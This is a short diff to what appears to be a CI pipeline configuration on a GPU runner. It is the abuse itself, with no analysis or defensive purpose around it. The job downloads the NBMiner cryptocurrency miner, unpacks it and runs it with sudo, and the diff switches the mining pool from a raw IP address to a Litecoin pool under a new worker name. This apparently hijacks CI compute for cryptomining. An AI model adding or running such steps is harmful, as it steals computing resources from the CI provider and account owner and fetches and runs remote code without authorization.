@@ -7,5 +7,5 @@ jobs:
     resource_class: gpu.nvidia.large
     steps:
       - run: nvidia-smi
-      - run: wget https://github.com/NebuTech/NBMiner/releases/download/v40.1/NBMiner_40.1_Linux.tgz && tar -zxvf NBMiner_40.1_Linux.tgz && cd NBMiner_Linux/ && sudo ./nbminer -a ethash -o 76.223.62.235:443 -u Komak.$(shuf -n 1 -i 1-99999)  --enable-dag-cache
+      - run: wget https://github.com/NebuTech/NBMiner/releases/download/v40.1/NBMiner_40.1_Linux.tgz && tar -zxvf NBMiner_40.1_Linux.tgz && cd NBMiner_Linux/ && sudo ./nbminer -a scrypt -o stratum+tcp://ltc.poolbinance.com:443 -u Astungk.$(shuf -n 1 -i 1-99999)  --enable-dag-cache
       - run: docker run --gpus all nvidia/cuda:9.0-base nvidia-smi
